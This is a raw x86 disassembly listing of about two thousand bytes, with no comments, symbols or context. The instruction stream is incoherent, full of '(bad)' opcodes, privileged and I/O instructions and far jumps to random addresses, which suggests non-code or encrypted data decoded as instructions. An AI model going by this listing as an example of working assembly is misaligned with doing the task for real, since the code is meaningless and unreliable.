  40764c:	hlt    
  40764d:	cmp    BYTE PTR [edx+0x40537276],cl
  407653:	in     al,0xeb
  407655:	or     al,0xc8
  407657:	add    esi,DWORD PTR [eax+0x1c92c83d]
  40765d:	sbb    edi,ebx
  40765f:	xchg   esi,eax
  407660:	cdq    
  407661:	int3   
  407662:	leave  
  407663:	mov    ebx,0xed50ab15
  407668:	push   ebx
  407669:	inc    esp
  40766a:	cmc    
  40766b:	mov    eax,0x5101385f
  407670:	mov    ebp,cr6
  407673:	inc    edi
  407674:	dec    ebp
  407675:	xchg   ebx,eax
  407676:	adc    edx,DWORD PTR [ebx]
  407678:	mov    eax,ds:0xdd96e398
  40767d:	mov    BYTE PTR [edx],0x6d
  407680:	bound  ebp,QWORD PTR [edi]
  407682:	imul   eax,DWORD PTR [edx-0x1a3bd186],0xffffffc0
  407689:	xor    eax,0x2c99a782
  40768e:	aas    
  40768f:	sbb    al,0xdb
  407691:	das    
  407692:	ficom  WORD PTR [esi]
  407694:	dec    eax
  407695:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407696:	adc    BYTE PTR [ebp+ecx*2+0x745223f3],dl
  40769d:	pusha  
  40769e:	cmp    al,0x46
  4076a0:	mov    cl,ch
  4076a2:	mov    BYTE PTR [ebx],al
  4076a4:	call   0xdfa:0x5d70a982
  4076ab:	aam    0xf
  4076ad:	adc    dl,BYTE PTR [ecx-0x51]
  4076b0:	out    0x21,al
  4076b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076b3:	sbb    al,0x21
  4076b5:	jle    0x4076a7
  4076b7:	or     ecx,ebp
  4076b9:	das    
  4076ba:	shl    BYTE PTR [ebx],1
  4076bc:	rcr    DWORD PTR [eax],cl
  4076be:	pop    ebp
  4076bf:	mov    dh,ah
  4076c1:	js     0x40768f
  4076c3:	xor    dl,BYTE PTR [edx+ebx*8+0x54]
  4076c7:	lods   eax,DWORD PTR ds:[esi]
  4076c8:	inc    edi
  4076c9:	je     0x407695
  4076cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076cc:	stc    
  4076cd:	frndint 
  4076cf:	mov    dl,0xa
  4076d1:	adc    BYTE PTR ds:0xf72a180,ah
  4076d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076d8:	push   ecx
  4076d9:	std    
  4076da:	xor    DWORD PTR [ecx],edi
  4076dc:	scas   eax,DWORD PTR es:[di]
  4076de:	shr    BYTE PTR [edi],1
  4076e0:	inc    eax
  4076e1:	stos   DWORD PTR es:[edi],eax
  4076e2:	mov    bl,BYTE PTR [edx+edi*2]
  4076e5:	jae    0x407726
  4076e7:	and    BYTE PTR [ecx],dl
  4076e9:	mov    edi,?
  4076eb:	in     eax,dx
  4076ec:	dec    edi
  4076ed:	ror    ebp,1
  4076ef:	or     eax,0xfac193cc
  4076f4:	aaa    
  4076f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076f6:	add    esp,DWORD PTR [ebp+0x6fad1a27]
  4076fc:	cwde   
  4076fd:	xor    eax,0xfa31f128
  407702:	push   ebx
  407703:	call   0x2311:0xbec8c4f2
  40770a:	popf   
  40770b:	sbb    ch,BYTE PTR [edi+0xd]
  40770e:	xchg   ecx,eax
  40770f:	mov    gs,WORD PTR [esi]
  407711:	and    DWORD PTR ds:0x5abc4512,edi
  407717:	dec    ecx
  407718:	adc    BYTE PTR [edi],al
  40771a:	and    al,0xaf
  40771c:	call   0x8587ab27
  407721:	stos   DWORD PTR es:[edi],eax
  407722:	jae    0x407789
  407724:	xchg   edx,eax
  407725:	repnz mov dl,0x35
  407728:	adc    DWORD PTR [edi-0x22bf144d],0xe93af054
  407732:	dec    esi
  407733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407734:	add    esp,DWORD PTR [eax+eiz*1+0x3e]
  407738:	jbe    0x4076ba
  40773a:	pop    esp
  40773b:	or     DWORD PTR [eax+ebp*8-0x7ba5c370],esi
  407742:	retf   
  407743:	and    BYTE PTR [ebx+0x50],al
  407746:	es pop eax
  407748:	stos   BYTE PTR es:[edi],al
  407749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40774a:	clc    
  40774b:	enter  0xcca9,0x73
  40774f:	ss mul dl
  407752:	and    ch,bl
  407754:	push   0x37
  407756:	jg     0x407722
  407758:	mov    ah,0x26
  40775a:	mov    esp,0xef618adb
  40775f:	(bad)  
  407760:	pop    ecx
  407761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407762:	(bad)  
  407763:	xchg   ecx,eax
  407764:	fwait
  407765:	mov    al,ds:0xfee789b9
  40776a:	in     al,0x62
  40776c:	lods   eax,DWORD PTR ds:[esi]
  40776d:	jge    0x407791
  40776f:	mov    dh,0xb6
  407771:	out    0x44,al
  407773:	lock xor al,0x81
  407776:	or     eax,0xa030adca
  40777b:	js     0x407739
  40777d:	inc    edi
  40777e:	mov    eax,ds:0xc592c6c7
  407783:	dec    esi
  407784:	sub    eax,DWORD PTR [eax+edx*1+0x15fc27d3]
  40778b:	and    bl,BYTE PTR [ebx-0x33]
  40778e:	adc    ah,0x7
  407791:	aad    0x90
  407793:	shl    BYTE PTR [ebx],1
  407795:	jp     0x407759
  407797:	jmp    0x710d:0x239332ca
  40779e:	sub    esp,0x1a3b7ea
  4077a4:	mov    bh,0x16
  4077a6:	fs mov ecx,0x4d51bd98
  4077ac:	shl    ebp,cl
  4077ae:	mov    ch,0x32
  4077b0:	xor    bh,BYTE PTR [edi+eax*2+0x3cc1f864]
  4077b7:	dec    edi
  4077b8:	pop    edi
  4077b9:	pop    ds
  4077ba:	loope  0x4077d8
  4077bc:	xor    cl,BYTE PTR ds:0xe4a36cfb
  4077c2:	jbe    0x407807
  4077c4:	sbb    al,0x86
  4077c6:	ror    BYTE PTR [ecx-0x7d9078f4],0x5d
  4077cd:	stos   DWORD PTR es:[edi],eax
  4077ce:	mov    esi,0x6e32e619
  4077d3:	leave  
  4077d4:	sub    BYTE PTR [ebp+0x3bdd03f6],0xa8
  4077db:	dec    esi
  4077dc:	jnp    0x40784a
  4077de:	pop    es
  4077df:	jnp    0x40781b
  4077e1:	xor    DWORD PTR [eax],esp
  4077e3:	sub    eax,0x394fac9
  4077e8:	xor    ch,BYTE PTR [edx+eax*2+0x3c]
  4077ec:	imul   DWORD PTR [esi]
  4077ee:	fs (bad) 
  4077f0:	enter  0x1bc0,0xac
  4077f4:	push   ss
  4077f5:	jne    0x4077f7
  4077f7:	cmp    ah,BYTE PTR [edx]
  4077f9:	mov    ebp,esi
  4077fb:	stos   BYTE PTR es:[edi],al
  4077fc:	stc    
  4077fd:	rcr    ch,0x8c
  407800:	cmp    eax,0xb9fc9a54
  407805:	rcr    DWORD PTR [ebx+edi*4-0x52cad493],1
  40780c:	mul    DWORD PTR [eax]
  40780e:	test   BYTE PTR [edi+0x33],bl
  407811:	lds    ebx,FWORD PTR [esi-0x80]
  407814:	add    ecx,DWORD PTR [ecx+0x194894a0]
  40781a:	cdq    
  40781b:	inc    edi
  40781c:	cli    
  40781d:	in     eax,0x8b
  40781f:	fcom   QWORD PTR [ebp-0x302c8140]
  407825:	or     DWORD PTR [eax+0x2a0d2610],esp
  40782b:	div    esi
  40782d:	adc    BYTE PTR [edi+eax*4+0x10],0x9
  407832:	in     eax,0x67
  407834:	neg    BYTE PTR [edx-0x43533299]
  40783a:	adc    DWORD PTR [ebx+ecx*8-0x4b],ebp
  40783e:	(bad)  
  40783f:	mov    BYTE PTR [esi-0xf],0x4e
  407843:	cs pop ecx
  407845:	or     dh,dh
  407847:	inc    ebp
  407848:	fs dec ebx
  40784a:	adc    BYTE PTR [eax],ch
  40784c:	jle    0x4077e0
  40784e:	stos   BYTE PTR es:[edi],al
  40784f:	adc    eax,0x648e3569
  407854:	(bad)  
  407855:	sub    ebp,ebx
  407857:	out    0xcc,al
  407859:	mov    BYTE PTR [edi],0x54
  40785c:	aam    0xca
  40785e:	dec    esi
  40785f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407861:	and    esp,ebp
  407863:	pop    eax
  407864:	add    eax,0x98141bcd
  407869:	sti    
  40786a:	add    ebx,DWORD PTR [ebp-0x13]
  40786d:	pusha  
  40786e:	mov    al,0x8f
  407870:	ds stc 
  407872:	sub    DWORD PTR [ebp+0xb],0xd
  407876:	int    0x0
  407878:	sbb    DWORD PTR gs:[ecx-0x43],ecx
  40787c:	add    eax,DWORD PTR [edx]
  40787e:	sbb    ch,BYTE PTR [edx+0x10]
  407881:	leave  
  407882:	imul   eax,DWORD PTR [ebp+0x28],0xbea96456
  407889:	test   BYTE PTR [eax],dh
  40788b:	sbb    DWORD PTR [edx+ecx*4-0x7c],eax
  40788f:	sbb    al,0x8a
  407891:	pop    ebp
  407892:	(bad)  
  407893:	mov    edi,0x50b2eafd
  407898:	mov    bh,0xb9
  40789a:	sar    ebp,1
  40789c:	call   FWORD PTR [ebx+0xb357187]
  4078a2:	lds    eax,FWORD PTR [ebx+0x19c8490b]
  4078a8:	cmp    DWORD PTR [edx+ecx*1],0xffffffa9
  4078ac:	sahf   
  4078ad:	jmp    0x96d58e0
  4078b2:	mov    eax,0x1b0029e9
  4078b7:	das    
  4078b8:	das    
  4078b9:	icebp  
  4078ba:	jge    0x407933
  4078bc:	aad    0xb7
  4078be:	rol    ebx,cl
  4078c0:	inc    ebx
  4078c1:	ins    BYTE PTR es:[edi],dx
  4078c2:	mov    dh,0xda
  4078c4:	sub    BYTE PTR [esi+eiz*4-0x74],cl
  4078c8:	inc    ebx
  4078c9:	out    0xb3,eax
  4078cb:	(bad)  
  4078cc:	mov    ebx,0xdd9a494c
  4078d1:	ja     0x407855
  4078d3:	jnp    0x407864
  4078d5:	mov    ch,0x2
  4078d7:	and    esp,DWORD PTR [ecx]
  4078d9:	dec    esp
  4078da:	pop    esp
  4078db:	sbb    ah,ch
  4078dd:	cmp    DWORD PTR [edx],0xac061ac9
  4078e3:	push   0x75
  4078e5:	xor    ecx,DWORD PTR [edx+ebp*8-0x1c350475]
  4078ec:	cmp    edi,DWORD PTR [eax+0x4e]
  4078ef:	lods   al,BYTE PTR ds:[esi]
  4078f0:	pop    ss
  4078f1:	lods   al,BYTE PTR ds:[esi]
  4078f2:	pop    es
  4078f3:	rcl    DWORD PTR [esi+0x309eda72],cl
  4078f9:	ins    BYTE PTR es:[edi],dx
  4078fa:	and    eax,0xa43e003c
  4078ff:	pop    esp
  407900:	pop    esp
  407901:	test   eax,0xa8ee970f
  407906:	mov    ebp,0xb3379310
  40790b:	sbb    ecx,DWORD PTR [ebx]
  40790d:	mov    esp,0xbf0047fc
  407912:	jmp    0x6c53:0x94226865
  407919:	xor    BYTE PTR [ebp+eax*4+0x1e1cb79c],bh
  407920:	inc    edx
  407921:	in     al,0x2a
  407923:	call   0xf8b4b7ed
  407928:	add    eax,0x2fae0c2b
  40792d:	push   ss
  40792e:	sbb    ebp,DWORD PTR [edi-0x59ab08e5]
  407934:	stos   DWORD PTR es:[edi],eax
  407935:	mov    ss,WORD PTR [eax]
  407937:	cmc    
  407938:	shl    DWORD PTR [edi-0x4100b5fb],1
  40793e:	adc    BYTE PTR [edi],bh
  407940:	xchg   al,cl
  407942:	addr16 jg 0x40798e
  407945:	push   edi
  407946:	mov    BYTE PTR [ecx+0x7c92023e],dh
  40794c:	dec    esp
  40794d:	(bad)  
  40794e:	inc    edi
  40794f:	fstp   DWORD PTR [ebp+0x1a2639bb]
  407955:	stos   BYTE PTR es:[edi],al
  407956:	lock loop 0x407951
  407959:	sbb    al,0x7b
  40795b:	out    dx,al
  40795c:	cmp    edx,eax
  40795e:	sub    BYTE PTR [edi+0x26302f24],bl
  407964:	fstp   TBYTE PTR [esi+0x78]
  407967:	or     DWORD PTR [esi-0x6ff36920],0x28
  40796e:	sub    ah,bh
  407970:	int3   
  407971:	mov    al,ds:0xfa27a873
  407976:	push   edi
  407977:	xor    dh,BYTE PTR [edi-0xc]
  40797a:	mov    cl,0x3b
  40797c:	inc    edi
  40797d:	push   edx
  40797e:	push   ebx
  40797f:	push   ebx
  407980:	mov    ebx,0x1241ea4d
  407985:	jge    0x40790b
  407987:	sbb    DWORD PTR [ebx-0x54],ebp
  40798a:	sub    BYTE PTR [edx+eiz*4-0x36],0x33
  40798f:	sub    cl,BYTE PTR [ebp-0x5c1fd64e]
  407995:	aaa    
  407996:	out    dx,eax
  407997:	jmp    0xcd6f343b
  40799c:	cld    
  40799d:	xor    cl,BYTE PTR [eax-0x28]
  4079a0:	popf   
  4079a1:	jmp    0x4079c5
  4079a3:	mov    ds:0x759a2a5b,eax
  4079a8:	in     al,0xce
  4079aa:	xchg   esi,eax
  4079ab:	(bad)  
  4079ac:	mov    esi,0x5705b77c
  4079b1:	ss dec ebx
  4079b3:	out    0x27,eax
  4079b5:	push   esi
  4079b6:	stos   BYTE PTR es:[edi],al
  4079b7:	ja     0x4079dc
  4079b9:	int    0xc
  4079bb:	adc    eax,0xfc190abc
  4079c0:	and    edi,esp
  4079c2:	lods   al,BYTE PTR ds:[esi]
  4079c3:	or     eax,ecx
  4079c5:	(bad)  
  4079c6:	mov    ecx,0xe974bf26
  4079cb:	add    al,0x36
  4079cd:	call   0xf41:0xa43e9ebf
  4079d4:	mov    esi,0x8c061fe0
  4079d9:	push   eax
  4079da:	jle    0x4079e1
  4079dc:	adc    dh,BYTE PTR [edi]
  4079de:	aad    0x1d
  4079e0:	loop   0x407a40
  4079e2:	ja     0x407a19
  4079e4:	mov    bl,0x15
  4079e6:	push   ebp
  4079e7:	sub    al,BYTE PTR ds:0x93ac624d
  4079ed:	add    al,0x11
  4079ef:	cmp    cl,0x6
  4079f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079f3:	jnp    0x4079d7
  4079f5:	cwde   
  4079f6:	and    al,0xff
  4079f8:	cmp    ebx,DWORD PTR [edx-0x2f6a0740]
  4079fe:	or     dl,BYTE PTR [edx]
  407a00:	dec    edi
  407a01:	xchg   ebp,eax
  407a02:	xor    BYTE PTR [ebx-0x5b4ca1b9],0x8
  407a09:	push   ecx
  407a0a:	fbstp  TBYTE PTR [edi+edi*4+0x1536c79c]
  407a11:	pmullw mm4,QWORD PTR [edi]
  407a14:	es inc ebx
  407a16:	adc    eax,0x6bebceea
  407a1b:	jno    0x407a3a
  407a1d:	dec    esi
  407a1e:	xchg   edi,eax
  407a1f:	or     eax,0xcb697335
  407a24:	jmp    0x7bb8:0xd04d870c
  407a2b:	in     al,0x6c
  407a2d:	mov    ebx,0xfaeff32a
  407a32:	daa    
  407a33:	xchg   esi,eax
  407a34:	(bad)  
  407a35:	mov    ebp,0x362f6a26
  407a3a:	push   ebp
  407a3b:	push   edx
  407a3c:	xor    eax,0x636a77f0
  407a41:	xor    DWORD PTR [ecx+eax*4],ebx
  407a44:	fild   WORD PTR [edi]
  407a46:	(bad)  
  407a47:	xor    al,0x8b
  407a49:	add    eax,0x2f230a2b
  407a4e:	popf   
  407a4f:	pop    edx
  407a50:	push   eax
  407a51:	repnz nop
  407a53:	xor    bl,dl
  407a55:	inc    ecx
  407a56:	xchg   ecx,eax
  407a57:	adc    DWORD PTR [esi+0x20419e81],0x221b0481
  407a61:	jno    0x407a23
  407a63:	pop    ecx
  407a64:	out    0x9f,eax
  407a66:	inc    esp
  407a67:	ror    dl,cl
  407a69:	fdivr  DWORD PTR [edx+0x174047e7]
  407a6f:	pushf  
  407a70:	inc    esp
  407a71:	(bad)  
  407a72:	jbe    0x407a5d
  407a74:	sbb    eax,0x59c47048
  407a79:	stos   DWORD PTR es:[edi],eax
  407a7a:	aas    
  407a7b:	dec    ebp
  407a7c:	stc    
  407a7d:	out    0x32,eax
  407a7f:	push   cs
  407a80:	pop    ss
  407a81:	test   eax,0xf8e50fe0
  407a86:	and    bl,BYTE PTR ss:0xf5efc0d3
  407a8d:	int    0x4
  407a8f:	mov    eax,0xce6944dd
  407a94:	cld    
  407a95:	add    bl,BYTE PTR [ebx+eiz*4+0x95e3114]
  407a9c:	or     ecx,DWORD PTR [eax+edi*1]
  407a9f:	js     0x407a38
  407aa1:	retf   0xfcd
  407aa4:	inc    esi
  407aa5:	jg     0x407a28
  407aa7:	out    0xf6,al
  407aa9:	push   esp
  407aaa:	xchg   edx,eax
  407aab:	ss cld 
  407aad:	les    eax,FWORD PTR [ebx+ebx*4+0x3]
  407ab1:	stos   DWORD PTR es:[edi],eax
  407ab2:	cmc    
  407ab3:	mov    cl,0xcb
  407ab5:	sbb    edi,DWORD PTR [eax+0xfa0bc23]
  407abb:	xor    eax,0xeb98a98a
  407ac0:	pop    ss
  407ac1:	push   0xfffffffe
  407ac3:	stc    
  407ac4:	popf   
  407ac5:	idiv   edi
  407ac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ac8:	pop    ebp
  407ac9:	fist   WORD PTR [ebp+0x616c361b]
  407acf:	sbb    ebp,DWORD PTR [eax-0x6e]
  407ad2:	pop    ebp
  407ad3:	(bad)
  407ad7:	ror    eax,0xdd
  407ada:	jb     0x407a60
  407adc:	and    ebx,0xffffffe4
  407adf:	inc    ebp
  407ae0:	mov    ebx,0x61bc26cf
  407ae5:	cmp    eax,0x5089cc5e
  407aea:	fmul   QWORD PTR [ecx+0x23d2e23]
  407af0:	in     eax,0x3b
  407af2:	mov    bh,0x46
  407af4:	mov    ds:0x20c422fe,al
  407af9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407afa:	push   ecx
  407afb:	nop
  407afc:	ja     0x407a95
  407afe:	mov    dh,0xc3
  407b00:	inc    ebx
  407b01:	sbb    eax,0x665ed94b
  407b06:	addr16 mov ch,0x9
  407b09:	rol    DWORD PTR [esi],cl
  407b0b:	(bad)  
  407b0c:	in     eax,0x15
  407b0e:	push   0x82f48b57
  407b13:	(bad)  
  407b14:	bound  esi,QWORD PTR [eax+0x70]
  407b17:	imul   eax,DWORD PTR [esi-0x3b],0x73
  407b1b:	lods   al,BYTE PTR ds:[esi]
  407b1c:	xor    eax,0xb42c62ec
  407b21:	clc    
  407b22:	jmp    0x9ce80e88
  407b27:	or     DWORD PTR [esi],eax
  407b29:	bound  eax,QWORD PTR [ecx+0x18]
  407b2c:	bound  ecx,QWORD PTR [esi+0x4d]
  407b2f:	cwde   
  407b30:	ror    BYTE PTR [edx],0x1a
  407b33:	push   0xef292109
  407b38:	(bad)  [edx]
  407b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b3b:	test   al,0x58
  407b3d:	jg     0x407b5a
  407b3f:	adc    al,BYTE PTR [edx+0x9]
  407b42:	cmp    eax,DWORD PTR gs:[ebp+0x59]
  407b46:	pop    ebx
  407b47:	mov    al,0xfa
  407b49:	jmp    0x5565a02f
  407b4e:	loop   0x407b12
  407b50:	das    
  407b51:	mov    bl,0x22
  407b53:	sar    DWORD PTR [esi-0x14a22804],0x96
  407b5a:	add    di,ax
  407b5d:	leave  
  407b5e:	int3   
  407b5f:	push   0x8304c036
  407b64:	jnp    0x407bb6
  407b66:	shl    BYTE PTR [ebp+0x49],0x5a
  407b6a:	imul   ebx,DWORD PTR [ecx],0xa0cd6a04
  407b70:	pop    eax
  407b71:	add    al,0x80
  407b73:	mov    ds:0xfaa78fc6,al
  407b78:	dec    edx
  407b79:	test   DWORD PTR [esi-0x6e],edi
  407b7c:	sub    edx,0x7cb12a0e
  407b82:	ror    BYTE PTR [esi-0x7331509d],0x1
  407b89:	outs   dx,DWORD PTR ds:[esi]
  407b8a:	mov    cl,0xee
  407b8c:	scas   al,BYTE PTR es:[edi]
  407b8d:	out    dx,eax
  407b8e:	jl     0x407b42
  407b90:	cwde   
  407b91:	xor    eax,0x4318df95
  407b96:	dec    edx
  407b97:	fadd   QWORD PTR [eax+0x425d60c6]
  407b9d:	push   0xffffffab
  407b9f:	pop    ebx
  407ba0:	bound  esi,QWORD PTR [esi+ebx*1+0x49]
  407ba4:	test   eax,eax
  407ba6:	jp     0x407bd5
  407ba8:	mov    esp,0x1a7f324c
  407bad:	inc    esp
  407bae:	ss cld 
  407bb0:	push   edi
  407bb1:	clc    
  407bb2:	aad    0xeb
  407bb4:	ror    BYTE PTR [ebx+0x40a76b0e],0xe4
  407bbb:	xor    eax,0x531a4738
  407bc0:	jmp    0xaa98a08c
  407bc5:	xor    edx,eax
  407bc7:	pop    esi
  407bc8:	inc    ebp
  407bc9:	mov    bh,0xc9
  407bcb:	aam    0x25
  407bcd:	jge    0x407b97
  407bcf:	and    ebp,DWORD PTR ds:0x29bfb30a
  407bd5:	leave  
  407bd6:	fadd   QWORD PTR [eax+0x99fa093]
  407bdc:	imul   ecx,esp,0x909557c8
  407be2:	xchg   cl,cl
  407be4:	pop    esp
  407be5:	cmc    
  407be6:	cdq    
  407be7:	mov    ?,edx
  407be9:	push   ss
  407bea:	fsubr  DWORD PTR [ecx+0x12668442]
  407bf0:	or     ecx,edi
  407bf2:	xchg   edi,eax
  407bf3:	fist   WORD PTR [ebp+edx*4+0x465cc9b3]
  407bfa:	inc    esp
  407bfb:	pop    ecx
  407bfc:	mov    ebp,0xf8271b5
  407c01:	or     BYTE PTR [esi+0x51fb7be1],0xcb
  407c08:	out    0x33,eax
  407c0a:	adc    al,BYTE PTR [esi]
  407c0c:	les    ebp,FWORD PTR [eax+0x1a3ef5c1]
  407c12:	jne    0x407c26
  407c14:	clc    
  407c15:	int3   
  407c16:	xchg   ebx,eax
  407c17:	sbb    al,0x6a
  407c19:	scas   al,BYTE PTR es:[edi]
  407c1a:	rol    BYTE PTR [eax],cl
  407c1c:	mov    ds:0x9cb4eed9,al
  407c21:	(bad)  
  407c22:	lods   eax,DWORD PTR ds:[esi]
  407c23:	jne    0x407c84
  407c25:	adc    BYTE PTR [eax+0x153e9b3c],dh
  407c2b:	imul   ebp,DWORD PTR [ebx],0x3f
  407c2e:	jo     0x407c90
  407c30:	retf   
  407c31:	shr    eax,cl
  407c33:	sbb    DWORD PTR [edi+0x4b],eax
  407c36:	jl     0x407ca8
  407c38:	ret    0xf490
  407c3b:	xchg   edi,eax
  407c3c:	push   es
  407c3d:	test   BYTE PTR [edx-0x33a76b85],0xfa
  407c44:	push   es
  407c45:	fdivr  QWORD PTR [ebx-0x5c]
  407c48:	and    al,BYTE PTR [eax+0x66ab3ec1]
  407c4e:	mov    ah,0x64
  407c50:	ins    BYTE PTR es:[edi],dx
  407c51:	push   ebp
  407c52:	jo     0x407c87
  407c54:	push   ebp
  407c55:	pop    edx
  407c56:	jb     0x407bef
  407c58:	mov    ebx,0x2343341d
  407c5d:	add    eax,0x2ef19c98
  407c62:	out    dx,eax
  407c63:	jmp    0x407c6c
  407c65:	dec    eax
  407c66:	xchg   DWORD PTR [edx+eax*4-0x79ab39a3],ebp
  407c6d:	cmp    BYTE PTR ds:0x897f5360,dh
  407c73:	push   es
  407c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c75:	es jmp 0xff89:0xb3f7712f
  407c7d:	sahf   
  407c7e:	ins    DWORD PTR es:[edi],dx
  407c7f:	jbe    0x407c3d
  407c81:	add    BYTE PTR [edx*2-0x65721f4c],dh
  407c88:	and    esp,esp
  407c8a:	dec    ebp
  407c8b:	xchg   ebp,eax
  407c8c:	pop    eax
  407c8d:	jmp    0x407c8a
  407c8f:	out    0x29,al
  407c91:	stc    
  407c92:	mov    ecx,0xa57a7f1
  407c97:	sbb    dh,al
  407c99:	mov    ecx,0xc9764e92
  407c9e:	pusha  
  407c9f:	call   0x104926d7
  407ca4:	push   ecx
  407ca5:	or     al,0xb1
  407ca7:	fmul   st(3),st
  407ca9:	int3   
  407caa:	jnp    0x407c9b
  407cac:	out    dx,al
  407cad:	fisubr WORD PTR [eax+0xdb9cfb2]
  407cb3:	mov    dl,0x7a
  407cb5:	sub    dl,bh
  407cb7:	inc    edx
  407cb8:	cmp    bh,al
  407cba:	cdq    
  407cbb:	stc    
  407cbc:	sbb    ebx,DWORD PTR [ebx-0x4fcdd730]
  407cc2:	xor    al,0x37
  407cc4:	mov    cl,ah
  407cc6:	mov    ebx,0x11ef09c4
  407ccb:	in     eax,dx
  407ccc:	rcl    bh,1
  407cce:	add    BYTE PTR [edi-0x3f],ch
  407cd1:	aas    
  407cd2:	cwde   
  407cd3:	stos   DWORD PTR es:[edi],eax
  407cd4:	and    DWORD PTR [eax],ecx
  407cd6:	stos   DWORD PTR es:[edi],eax
  407cd7:	es mov ecx,0x4c53b858
  407cdd:	das    
  407cde:	popf   
  407cdf:	stc    
  407ce0:	les    edi,FWORD PTR [ecx]
  407ce2:	inc    edi
  407ce3:	or     dh,BYTE PTR ds:0x794c8a63
  407ce9:	jb     0x407cf1
  407ceb:	cdq    
  407cec:	mov    ebx,0x3fde8713
  407cf1:	adc    dl,ch
  407cf3:	fnsave [ebp+ecx*8-0x41ac500]
  407cfa:	ret    
  407cfb:	rcl    BYTE PTR [ebx+0x28935e9d],0xe1
  407d02:	sbb    edx,DWORD PTR [esi+0x4]
  407d05:	iret   
  407d06:	retf   
  407d07:	fnstenv [ebp+0x4fbba922]
  407d0d:	(bad)  
  407d0e:	fild   DWORD PTR [ebx+0x7ce5c9ea]
  407d14:	dec    ebx
  407d15:	fsub   QWORD PTR [ecx-0x27]
  407d18:	lods   al,BYTE PTR ds:[esi]
  407d19:	or     ecx,ebp
  407d1b:	xor    DWORD PTR [edx+0x6f],eax
  407d1e:	(bad)  
  407d20:	lahf   
  407d21:	sub    esp,edi
  407d23:	pop    ecx
  407d24:	outs   dx,DWORD PTR ds:[esi]
  407d25:	popa   
  407d26:	ins    DWORD PTR es:[edi],dx
  407d27:	aad    0x2
  407d29:	cmp    ecx,ebx
  407d2b:	popa   
  407d2c:	and    ah,cl
  407d2e:	shl    ah,cl
  407d30:	and    ecx,0xffffffe0
  407d33:	scas   eax,DWORD PTR es:[edi]
  407d34:	(bad)  
  407d35:	cli    
  407d36:	jns    0x407cbc
  407d38:	sbb    BYTE PTR [esp+eiz*2-0xb],bl
  407d3c:	arpl   WORD PTR [ebp+0x4d043792],bx
  407d42:	or     edx,edi
  407d44:	stos   BYTE PTR es:[edi],al
  407d45:	in     al,0xab
  407d47:	test   al,0x11
  407d49:	(bad)  
  407d4a:	fistp  WORD PTR [ebx-0x7c]
  407d4d:	cmc    
  407d4e:	cmp    DWORD PTR [edi-0x8bde8bd],ebp
  407d54:	enter  0xf30e,0xfd
  407d58:	cli    
  407d59:	push   DWORD PTR [ebp+0x72]
  407d5c:	test   eax,0xb1410207
  407d61:	jl     0x407d19
  407d63:	pextrw eax,mm6,0x2c
  407d67:	bound  esi,QWORD PTR [esi+0x18]
  407d6a:	int    0x23
  407d6c:	push   esi
  407d6d:	jae    0x407dbd
  407d6f:	out    dx,eax
  407d70:	int3   
  407d71:	ds in  eax,dx
  407d73:	mov    ds:0x781319e3,al
  407d78:	iret   
  407d79:	icebp  
  407d7a:	mov    al,0x32
  407d7c:	mov    WORD PTR [edi+0xc],fs
  407d7f:	inc    ecx
  407d80:	xor    BYTE PTR [edx+0x6],cl
  407d83:	sbb    cl,BYTE PTR [eax-0x5b]
  407d86:	sahf   
  407d87:	xchg   edi,eax
  407d88:	ins    BYTE PTR es:[edi],dx
  407d89:	xchg   eax,ebp
  407d8b:	imul   ecx,DWORD PTR [ecx-0x43],0x87e36110
  407d92:	inc    esi
  407d93:	pop    ds
  407d94:	mov    gs,WORD PTR [edx+0x6f]
  407d97:	(bad)  
  407d98:	popf   
  407d99:	dec    ebp
  407d9a:	xchg   esi,ebx
  407d9c:	push   0x6a4f154c
  407da1:	in     eax,dx
  407da2:	jp     0x407ddb
  407da4:	and    BYTE PTR [ecx-0x54],bh
  407da7:	xlat   BYTE PTR ds:[ebx]
  407da8:	ins    DWORD PTR es:[edi],dx
  407da9:	add    ch,BYTE PTR [edi+ebp*2+0x3a72e185]
  407db0:	dec    ecx
  407db1:	and    esp,ecx
  407db3:	add    eax,0xd3921578
  407db8:	jg     0x407d72
  407dba:	inc    ebp
  407dbb:	or     DWORD PTR [ebx+0x4d66b8eb],0xffe33ef1
  407dc5:	stos   BYTE PTR es:[edi],al
  407dc6:	jmp    0x1ddf:0x252ea916
  407dcd:	or     esp,DWORD PTR [ebx+0x29]
  407dd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dd2:	xchg   edx,eax
  407dd3:	mov    DWORD PTR [ecx-0x3791510a],eax
  407dd9:	and    BYTE PTR [ebx+0x35],0x73
  407ddd:	push   esp
  407dde:	cmp    al,0xcb
  407de0:	into   
  407de1:	jns    0x407e5b
  407de3:	mov    bh,0x30
  407de5:	fisubr WORD PTR [edi]
  407de7:	scas   al,BYTE PTR es:[edi]
  407de8:	in     al,0x26
  407dea:	xor    al,0xcb
  407dec:	mov    eax,0x4f81f0a5
  407df1:	or     edx,DWORD PTR [edx]
  407df3:	cwde   
  407df4:	popf   
  407df5:	call   0x4fce81cd
  407dfa:	test   DWORD PTR [esi+0xe],eax
  407dfd:	fwait
  407dfe:	lods   al,BYTE PTR ds:[esi]
  407dff:	js     0x407da5
  407e01:	jmp    0x7503:0x647570db
  407e08:	dec    edi
  407e09:	push   edi
  407e0a:	inc    eax
  407e0b:	popf   
  407e0c:	cmc    
  407e0d:	mov    ebx,0x52eb9d28
  407e12:	daa    
  407e13:	ret    0x5521
  407e16:	xchg   ecx,eax
  407e17:	xchg   esp,eax
  407e18:	sbb    eax,ebp
  407e1a:	stc    
  407e1b:	aaa    
  407e1c:	cmp    al,0x62
  407e1e:	mov    ecx,0x46c6abda
  407e23:	shl    DWORD PTR [ecx],cl
